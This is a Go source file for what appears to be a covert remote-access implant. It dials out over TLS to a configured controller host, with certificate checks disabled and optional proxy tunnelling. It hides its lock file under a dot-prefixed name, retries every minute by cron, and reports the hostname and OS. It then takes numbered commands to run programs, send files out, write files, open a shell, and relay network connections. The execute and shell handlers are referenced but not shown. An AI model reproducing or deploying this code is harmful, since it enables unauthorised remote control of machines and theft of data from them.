package main

import (
	"bufio"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"github.com/nightlyone/lockfile"
	"github.com/robfig/cron"
	"github.com/xtaci/smux"
	"io"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	httpProxyHost string
	httpsProxyHost string
	proxyUsername string
	proxyPassword string
	connectHost string
	pubKeySum string

	connTimeout = 60 * time.Second
	connected = false
	)

func main() {
	lock, err := lockfile.New(filepath.Join(os.TempDir(), getLockfileName()))
	if err != nil {
		return
	}

	err = lock.TryLock()
	if err != nil {
		return
	}

	defer lock.Unlock()

	var wg sync.WaitGroup
	wg.Add(1)

	go serve()

	c := cron.New()
	c.AddFunc("0 * * * * *", serve)
	c.Start()

	wg.Wait()
}



func getLockfileName() string {
	return "." + getHexSumFromString(connectHost + httpProxyHost + httpsProxyHost + proxyUsername + proxyPassword)
}

func serve() {
	if connected {
		return
	}
	connected = true

	var wg sync.WaitGroup
	wg.Add(1)

	a := NewAgent(&wg)
	a.Start()

	wg.Wait()

	connected = false
}

func getHexSum(value []byte) string {
	hash := sha256.New()
	hash.Write(value)
	sum := hash.Sum(nil)
	return hex.EncodeToString(sum)
}

func getHexSumFromString(value string) string {
	return getHexSum([]byte(value))
}

func getSystemInfo() string {
	var info string

	info += runtime.GOOS + "|"
	info += runtime.GOARCH + "|"
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	info += hostname + "\n"

	return info
}

func readString(reader *bufio.Reader) string {
	line, _, _ := reader.ReadLine()
	return string(line)
}

func openNewStream(session *smux.Session) *smux.Stream {
	stream, err := session.OpenStream()
	if err != nil {
		return nil
	}
	return stream
}

func handleConnection(conn net.Conn, stream *smux.Stream) {
	defer conn.Close()
	defer stream.Close()

	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		io.Copy(stream, conn)
		stream.Close()
		wg.Done()
	}()

	go func() {
		io.Copy(conn, stream)
		conn.Close()
		wg.Done()
	}()

	wg.Wait()
}

/* ------------------
  Agent
 -------------------- */

type Agent struct {
	wg *sync.WaitGroup
	conn *tls.Conn
	session *smux.Session
}

func NewAgent(wg *sync.WaitGroup) *Agent {
	return &Agent{
		wg: wg,
	}
}

func (a *Agent) Start() {
	err := a.connectToRemote()
	if err == nil {
		a.handleSession()
	}
	a.wg.Done()
}

func (a *Agent) connectToRemote() error {
	var rawConn net.Conn
	var err error

	config := tls.Config{ InsecureSkipVerify: true}

	if httpsProxyHost != "" {
		rawConn, err = tls.Dial("tcp", httpsProxyHost, &config)
		if err != nil {
			return err
		}
		err = a.connectToProxy(rawConn)
	} else if httpProxyHost != "" {
		rawConn, err = net.DialTimeout("tcp", httpProxyHost, connTimeout)
		if err != nil {
			return err
		}
		err = a.connectToProxy(rawConn)
	} else {
		rawConn, err = net.DialTimeout("tcp", connectHost, connTimeout)
	}

	if err != nil {
		return err
	}

	rawConn.SetDeadline(time.Now().Add(connTimeout))

	a.conn = tls.Client(rawConn, &config)

	err = a.conn.Handshake()
	if err != nil {
		return err
	}

	rawConn.SetDeadline(time.Time{})

	err = a.checkServerPubKey()
	if err != nil {
		a.conn.Close()
	}

	return err
}

func (a *Agent) checkServerPubKey() error {
	if pubKeySum == "" {
		return nil
	}

	connectionState := a.conn.ConnectionState()
	if len(connectionState.PeerCertificates) == 0 {
		return errors.New("")
	}

	key, _ := x509.MarshalPKIXPublicKey(a.conn.ConnectionState().PeerCertificates[0].PublicKey)
	serverPubKeySum := getHexSum(key)

	if !strings.EqualFold(pubKeySum, serverPubKeySum) {
		return errors.New("")
	}
	return nil
}

func (a *Agent) connectToProxy(conn net.Conn) error {
	proxyRequest := "CONNECT " + connectHost +  " HTTP/1.1\n"
	if proxyUsername != "" {
		authorization := []byte(proxyUsername + ":" + proxyPassword)
		proxyRequest += "Proxy-Authorization: basic " + base64.StdEncoding.EncodeToString(authorization) +  "\n"
	}
	proxyRequest += "\n"
	_, err := conn.Write([]byte(proxyRequest))

	bufio.NewReader(conn).ReadLine()

	return err
}

func (a *Agent) handleSession() {

	a.conn.Write([]byte("CONNECT / HTTP/1.1\n\n"))

	defer a.conn.Close()

	var err error

	a.session, err = smux.Server(a.conn, nil)
	if err != nil {
		return
	}
	defer a.session.Close()

	inputCommandStream, err := a.session.AcceptStream()
	if err != nil {
		return
	}
	defer inputCommandStream.Close()

	_, err = inputCommandStream.Write([]byte(getSystemInfo()))
	if err != nil {
		return
	}

	reader := bufio.NewReader(inputCommandStream)

	loop:
	for true {

		line, _, err := reader.ReadLine()
		if err != nil {
			break
		}

		command, _ := strconv.Atoi(string(line))
		switch command {
		case 0:
			go a.execute(readString(reader))
			break
		case 1:
			go a.download(readString(reader))
			break
		case 2:
			go a.upload(readString(reader))
			break
		case 3:
			go a.shell()
			break
		case 4:
			go a.listen(readString(reader))
			break
		case 5:
			go a.connect(readString(reader))
			break
		case 6:
			break loop
		default:
			break
		}
	}
}

func (a *Agent) listen(address string) {

	listenCommandStream, err := a.session.OpenStream()
	if err != nil {
		return
	}

	defer listenCommandStream.Close()

	reader := bufio.NewReader(listenCommandStream)

	ln, err := net.Listen("tcp", address)
	if err != nil {
		return
	}

	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			break
		}

		_, err = listenCommandStream.Write([]byte("listen\n"))
		if err != nil {
			conn.Close()
			break
		}

		_, _, err = reader.ReadLine()
		if err != nil {
			conn.Close()
			break
		}

		stream, err := a.session.AcceptStream()
		if err != nil {
			conn.Close()
			break
		}

		go handleConnection(conn, stream)
	}
}

func (a *Agent) connect(address string) {

	listenStream, err := a.session.OpenStream()
	if err != nil {
		return
	}

	conn, err := net.Dial("tcp", string(address))
	if err != nil {
		listenStream.Close()
		return
	}

	go handleConnection(conn, listenStream)
}

func (a *Agent) download(filename string) {

	stream := openNewStream(a.session)

	if  stream == nil {
		return
	}

	defer stream.Close()

	file, err := os.OpenFile(filename, os.O_RDONLY, 0755)
	if err != nil {
		return
	}

	defer file.Close()

	io.Copy(stream, file)
}

func (a *Agent) upload(filename string) {

	stream := openNewStream(a.session)

	if  stream == nil {
		return
	}

	defer stream.Close()

	file, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0755)
	if err != nil {
		return
	}

	defer file.Close()

	io.Copy(file, stream)

}